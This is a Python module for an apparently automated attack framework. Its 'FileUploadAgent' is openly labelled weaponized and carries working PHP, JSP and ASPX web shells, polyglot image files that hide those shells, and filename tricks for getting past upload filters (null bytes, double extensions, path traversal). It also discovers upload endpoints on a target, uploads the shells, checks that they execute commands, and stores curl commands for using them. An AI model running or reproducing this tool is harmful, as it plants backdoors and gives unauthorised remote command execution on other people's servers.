"""
FileUploadAgent - Weaponized File Upload Exploitation
โจมตีช่องโหว่ File Upload ด้วยเทคนิคการ bypass ที่หลากหลาย
"""

import asyncio
import hashlib
import os
import base64
import mimetypes
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse
import aiohttp

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase, Strategy
from core.logger import log


class FileUploadAgent(BaseAgent):
    """
    Weaponized File Upload Exploitation Agent
    
    Features:
    - Multiple shell types (PHP, JSP, ASPX, Python)
    - Polyglot file generation
    - Extension bypass techniques
    - MIME type manipulation
    - Magic byte injection
    - Content-Type header bypass
    - Path traversal via filename
    - Automatic shell verification
    """
    
    supported_phases = [AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.results_dir = "workspace/loot/file_upload"
        os.makedirs(self.results_dir, exist_ok=True)
        
        self.uploaded_shells = []
        self.successful_uploads = []
        self.shell_types = kwargs.get('shell_types', ['php', 'jsp', 'aspx'])
        self.bypass_techniques = kwargs.get('bypass_techniques', 'all')
        
    def _generate_php_shells(self) -> Dict[str, bytes]:
        """สร้าง PHP webshells หลายรูปแบบ"""
        return {
            'simple': b'<?php system($_GET["cmd"]); ?>',
            'obfuscated': b'<?php @eval($_POST["x"]); ?>',
            'one_liner': b'<?php `$_GET[0]`; ?>',
            'b374k': b'<?php\n// Mini WebShell\nif(isset($_REQUEST["cmd"])){\n    echo "<pre>";\n    $cmd = ($_REQUEST["cmd"]);\n    system($cmd);\n    echo "</pre>";\n    die;\n}\n?>',
            'sophisticated': b'''<?php
@error_reporting(0);
@set_time_limit(0);
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    if(function_exists('system')){
        @ob_start();
        @system($cmd);
        $output = @ob_get_contents();
        @ob_end_clean();
    }elseif(function_exists('exec')){
        @exec($cmd,$results);
        $output = @join("\\n",$results);
    }elseif(function_exists('shell_exec')){
        $output = @shell_exec($cmd);
    }
    echo $output;
}
?>''',
        }
    
    def _generate_jsp_shells(self) -> Dict[str, bytes]:
        """สร้าง JSP webshells"""
        return {
            'simple': b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            'full': b'''<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null){
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while((line = reader.readLine()) != null){
            out.println(line);
        }
    }
%>''',
        }
    
    def _generate_aspx_shells(self) -> Dict[str, bytes]:
        """สร้าง ASPX webshells"""
        return {
            'simple': b'<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start(new ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]) { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd();%>',
            'full': b'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request["cmd"];
        if(!string.IsNullOrEmpty(cmd))
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmd;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            StreamReader reader = p.StandardOutput;
            string output = reader.ReadToEnd();
            Response.Write("<pre>" + output + "</pre>");
        }
    }
</script>''',
        }
    
    def _create_polyglot_image(self, shell_code: bytes, image_type: str = 'gif') -> bytes:
        """สร้าง polyglot file ที่เป็นทั้ง image และ executable code"""
        if image_type == 'gif':
            # GIF89a header + PHP code
            gif_header = b'GIF89a' + b'\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xFF\xFF\xFF\x21\xF9\x04\x01\x00\x00\x00\x00\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3B'
            return gif_header + b'\n' + shell_code
        
        elif image_type == 'jpg':
            # JPEG header + PHP code
            jpeg_header = b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
            jpeg_footer = b'\xFF\xD9'
            return jpeg_header + b'\n' + shell_code + b'\n' + jpeg_footer
        
        elif image_type == 'png':
            # PNG header + PHP code
            png_header = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
            png_footer = b'\x00\x00\x00\x00IEND\xaeB`\x82'
            return png_header + b'\n' + shell_code + b'\n' + png_footer
        
        return shell_code
    
    def _generate_bypass_filenames(self, base_name: str, extension: str) -> List[str]:
        """สร้างรายการชื่อไฟล์ที่ใช้เทคนิค bypass"""
        filenames = [
            f"{base_name}.{extension}",  # Normal
            f"{base_name}.{extension}.jpg",  # Double extension
            f"{base_name}.jpg.{extension}",  # Reverse double extension
            f"{base_name}.{extension}\x00.jpg",  # Null byte
            f"{base_name}.{extension}%00.jpg",  # URL-encoded null byte
            f"{base_name}.{extension}%20",  # Trailing space
            f"{base_name}.{extension}.",  # Trailing dot
            f"{base_name}.{extension}::$DATA",  # NTFS ADS
        ]
        
        # Extension variations
        if extension == 'php':
            filenames.extend([
                f"{base_name}.php3",
                f"{base_name}.php4",
                f"{base_name}.php5",
                f"{base_name}.php7",
                f"{base_name}.phtml",
                f"{base_name}.phps",
                f"{base_name}.pht",
                f"{base_name}.inc",
            ])
        elif extension == 'asp':
            filenames.extend([
                f"{base_name}.aspx",
                f"{base_name}.asa",
                f"{base_name}.cer",
                f"{base_name}.cdx",
            ])
        
        # Case variations
        filenames.extend([
            f"{base_name}.{extension.upper()}",
            f"{base_name}.{extension.capitalize()}",
            f"{base_name}.{extension[0].upper()}{extension[1:]}",
        ])
        
        # Path traversal attempts
        filenames.extend([
            f"../../../{base_name}.{extension}",
            f"..\\..\\..\\{base_name}.{extension}",
            f"....//....//..../{base_name}.{extension}",
        ])
        
        return filenames
    
    async def _upload_file(
        self, 
        url: str, 
        filename: str, 
        content: bytes, 
        content_type: str = None,
        additional_fields: Dict[str, str] = None
    ) -> Tuple[bool, str, Any]:
        """อัปโหลดไฟล์และตรวจสอบผลลัพธ์"""
        try:
            # Prepare multipart form data
            data = aiohttp.FormData()
            
            # Add additional form fields if any
            if additional_fields:
                for key, value in additional_fields.items():
                    data.add_field(key, value)
            
            # Add file
            if content_type:
                data.add_field('file', content, filename=filename, content_type=content_type)
            else:
                # Auto-detect or use generic
                mime_type = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
                data.add_field('file', content, filename=filename, content_type=mime_type)
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=data, timeout=30) as response:
                    status = response.status
                    response_text = await response.text()
                    
                    # Check if upload was successful
                    success = status in [200, 201, 301, 302]
                    
                    return success, response_text, response
                    
        except Exception as e:
            log.error(f"[FileUploadAgent] Upload error for {filename}: {e}")
            return False, str(e), None
    
    async def _verify_shell_execution(self, shell_url: str, shell_type: str) -> bool:
        """ตรวจสอบว่า shell สามารถ execute ได้หรือไม่"""
        try:
            async with aiohttp.ClientSession() as session:
                # Test with simple commands based on shell type
                if shell_type in ['php', 'jsp', 'aspx']:
                    test_urls = [
                        f"{shell_url}?cmd=echo%20DLNK_TEST_12345",
                        f"{shell_url}?cmd=whoami",
                    ]
                    
                    for test_url in test_urls:
                        async with session.get(test_url, timeout=10) as response:
                            response_text = await response.text()
                            
                            # Check for command execution indicators
                            if 'DLNK_TEST_12345' in response_text or \
                               ('root' in response_text.lower() or 
                                'www-data' in response_text.lower() or
                                'apache' in response_text.lower() or
                                'nginx' in response_text.lower() or
                                'system' in response_text.lower()):
                                return True
                
                return False
                
        except Exception as e:
            log.debug(f"[FileUploadAgent] Shell verification error: {e}")
            return False
    
    async def _discover_upload_endpoints(self, base_url: str) -> List[Dict[str, Any]]:
        """ค้นหา upload endpoints"""
        # Get from context manager - crawled forms
        endpoints = []
        
        try:
            # Check if we have crawled forms from WebCrawlerAgent
            if self.context_manager:
                forms = await self.context_manager.get_context('crawled_forms') or []
                
                for form in forms:
                    # Look for file input fields
                    if any('file' in str(input_field).lower() for input_field in form.get('inputs', [])):
                        endpoints.append({
                            'url': urljoin(base_url, form.get('action', '')),
                            'method': form.get('method', 'POST'),
                            'fields': form.get('inputs', [])
                        })
            
            # Common upload endpoints
            common_paths = [
                '/upload',
                '/upload.php',
                '/file/upload',
                '/api/upload',
                '/admin/upload',
                '/user/upload',
                '/files/upload',
                '/attachment/upload',
                '/media/upload',
                '/image/upload',
                '/avatar/upload',
            ]
            
            for path in common_paths:
                endpoints.append({
                    'url': urljoin(base_url, path),
                    'method': 'POST',
                    'fields': []
                })
                
        except Exception as e:
            log.error(f"[FileUploadAgent] Error discovering endpoints: {e}")
        
        return endpoints
    
    async def run(self, strategy: Strategy = None, **kwargs) -> AgentData:
        """Execute file upload exploitation"""
        log.info("[FileUploadAgent] Starting file upload exploitation...")
        
        try:
            # Get target URL
            target_url = await self.context_manager.get_context('target_url') if self.context_manager else kwargs.get('target_url')
            
            if not target_url:
                return self.create_report(
                    summary="No target URL provided",
                    errors=["Target URL is required"]
                )
            
            base_url = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
            
            # Discover upload endpoints
            log.info("[FileUploadAgent] Discovering upload endpoints...")
            endpoints = await self._discover_upload_endpoints(base_url)
            log.info(f"[FileUploadAgent] Found {len(endpoints)} potential upload endpoints")
            
            # Generate shells
            shells_to_test = {}
            
            if 'php' in self.shell_types:
                php_shells = self._generate_php_shells()
                for name, code in php_shells.items():
                    shells_to_test[f'php_{name}'] = {
                        'code': code,
                        'extension': 'php',
                        'type': 'php'
                    }
                    
                    # Create polyglot versions
                    for img_type in ['gif', 'jpg', 'png']:
                        polyglot = self._create_polyglot_image(code, img_type)
                        shells_to_test[f'php_{name}_polyglot_{img_type}'] = {
                            'code': polyglot,
                            'extension': img_type,
                            'type': 'php',
                            'polyglot': True
                        }
            
            if 'jsp' in self.shell_types:
                jsp_shells = self._generate_jsp_shells()
                for name, code in jsp_shells.items():
                    shells_to_test[f'jsp_{name}'] = {
                        'code': code,
                        'extension': 'jsp',
                        'type': 'jsp'
                    }
            
            if 'aspx' in self.shell_types:
                aspx_shells = self._generate_aspx_shells()
                for name, code in aspx_shells.items():
                    shells_to_test[f'aspx_{name}'] = {
                        'code': code,
                        'extension': 'aspx',
                        'type': 'aspx'
                    }
            
            log.info(f"[FileUploadAgent] Generated {len(shells_to_test)} shell variations to test")
            
            # Test uploads
            upload_count = 0
            success_count = 0
            
            for endpoint in endpoints:
                endpoint_url = endpoint['url']
                log.info(f"[FileUploadAgent] Testing endpoint: {endpoint_url}")
                
                for shell_name, shell_data in shells_to_test.items():
                    # Generate bypass filenames
                    base_name = f"dlnk_{hashlib.md5(str(upload_count).encode()).hexdigest()[:8]}"
                    filenames = self._generate_bypass_filenames(base_name, shell_data['extension'])
                    
                    for filename in filenames[:5]:  # Test first 5 bypass techniques per shell
                        upload_count += 1
                        
                        # Try different content types
                        content_types = [
                            None,  # Auto-detect
                            'image/gif',
                            'image/jpeg',
                            'image/png',
                            'application/octet-stream',
                        ] if shell_data.get('polyglot') else [None]
                        
                        for ct in content_types:
                            success, response, resp_obj = await self._upload_file(
                                endpoint_url,
                                filename,
                                shell_data['code'],
                                content_type=ct
                            )
                            
                            if success:
                                log.success(f"[FileUploadAgent] Successfully uploaded: {filename}")
                                
                                # Try to find uploaded file location
                                # Common patterns in response
                                import re
                                url_patterns = [
                                    r'"url":\s*"([^"]+)"',
                                    r'"path":\s*"([^"]+)"',
                                    r'"file":\s*"([^"]+)"',
                                    r'href="([^"]+' + re.escape(filename) + r')"',
                                    r'src="([^"]+' + re.escape(filename) + r')"',
                                ]
                                
                                uploaded_url = None
                                for pattern in url_patterns:
                                    match = re.search(pattern, response)
                                    if match:
                                        uploaded_url = urljoin(base_url, match.group(1))
                                        break
                                
                                # Try common upload directories
                                if not uploaded_url:
                                    common_dirs = [
                                        '/uploads/',
                                        '/files/',
                                        '/media/',
                                        '/images/',
                                        '/attachments/',
                                        '/tmp/',
                                        '/upload/',
                                    ]
                                    
                                    for directory in common_dirs:
                                        uploaded_url = urljoin(base_url, directory + filename)
                                        # We'll verify later
                                        break
                                
                                if uploaded_url:
                                    # Verify shell execution
                                    log.info(f"[FileUploadAgent] Verifying shell at: {uploaded_url}")
                                    is_executable = await self._verify_shell_execution(uploaded_url, shell_data['type'])
                                    
                                    upload_info = {
                                        'endpoint': endpoint_url,
                                        'filename': filename,
                                        'shell_type': shell_data['type'],
                                        'shell_name': shell_name,
                                        'url': uploaded_url,
                                        'executable': is_executable,
                                        'content_type': ct,
                                        'polyglot': shell_data.get('polyglot', False)
                                    }
                                    
                                    self.successful_uploads.append(upload_info)
                                    success_count += 1
                                    
                                    if is_executable:
                                        self.uploaded_shells.append(upload_info)
                                        log.success(f"[FileUploadAgent] ✓ EXECUTABLE SHELL: {uploaded_url}")
                                        
                                        # Save shell info
                                        self._save_shell_info(upload_info)
                                        
                                        # Publish to PubSub
                                        if self.orchestrator and hasattr(self.orchestrator, 'pubsub_manager'):
                                            await self.orchestrator.pubsub_manager.publish(
                                                'file_upload_shell',
                                                upload_info
                                            )
                            
                            # Rate limiting
                            await asyncio.sleep(0.5)
            
            # Generate report
            summary = f"File upload testing complete. Tested {upload_count} uploads across {len(endpoints)} endpoints. "
            summary += f"Successful uploads: {success_count}, Executable shells: {len(self.uploaded_shells)}"
            
            log.success(f"[FileUploadAgent] {summary}")
            
            return self.create_report(
                summary=summary,
                successful_uploads=self.successful_uploads,
                executable_shells=self.uploaded_shells,
                total_attempts=upload_count,
                success_count=success_count,
                shell_count=len(self.uploaded_shells)
            )
            
        except Exception as e:
            log.error(f"[FileUploadAgent] Error during execution: {e}", exc_info=True)
            return self.create_report(
                summary=f"File upload exploitation failed: {str(e)}",
                errors=[str(e)]
            )
    
    def _save_shell_info(self, shell_info: Dict[str, Any]):
        """บันทึกข้อมูล shell ที่อัปโหลดสำเร็จ"""
        try:
            filename = f"shell_{hashlib.md5(shell_info['url'].encode()).hexdigest()[:8]}.txt"
            filepath = os.path.join(self.results_dir, filename)
            
            with open(filepath, 'w') as f:
                f.write("=== FILE UPLOAD SHELL INFO ===\n")
                f.write(f"URL: {shell_info['url']}\n")
                f.write(f"Endpoint: {shell_info['endpoint']}\n")
                f.write(f"Filename: {shell_info['filename']}\n")
                f.write(f"Shell Type: {shell_info['shell_type']}\n")
                f.write(f"Shell Name: {shell_info['shell_name']}\n")
                f.write(f"Executable: {shell_info['executable']}\n")
                f.write(f"Polyglot: {shell_info.get('polyglot', False)}\n")
                f.write(f"Content-Type: {shell_info.get('content_type', 'N/A')}\n")
                f.write("\n=== USAGE ===\n")
                f.write(f"curl '{shell_info['url']}?cmd=whoami'\n")
                f.write(f"curl '{shell_info['url']}?cmd=id'\n")
                f.write(f"curl '{shell_info['url']}?cmd=uname%20-a'\n")
            
            log.info(f"[FileUploadAgent] Shell info saved to: {filepath}")
            
        except Exception as e:
            log.error(f"[FileUploadAgent] Failed to save shell info: {e}")

